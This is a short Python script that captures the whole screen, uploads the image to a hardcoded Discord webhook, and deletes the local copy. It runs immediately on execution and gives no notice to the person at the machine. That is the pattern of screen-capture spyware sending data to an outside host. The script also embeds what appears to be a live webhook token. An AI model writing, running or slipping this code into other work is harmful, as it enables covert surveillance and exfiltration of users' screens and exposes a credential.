import requests
import pyscreenshot as ImageGrab
import os

# Replace with your webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1344582879648288819/3TN8TbVgzj_t1lB0V7UMnDYKy9cUZ6VUlSunvbNigoNZG0SY3zXF7j8S4hzeRY9c3O_P"

def send_screenshot():
    screenshot_path = "screenshot.png"

    # Take a screenshot
    img = ImageGrab.grab()
    img.save(screenshot_path)

    # Send screenshot to Discord
    with open(screenshot_path, "rb") as f:
        files = {"file": f}
        requests.post(WEBHOOK_URL, files=files)

    # Delete the screenshot after sending
    os.remove(screenshot_path)

# Run the function
send_screenshot()
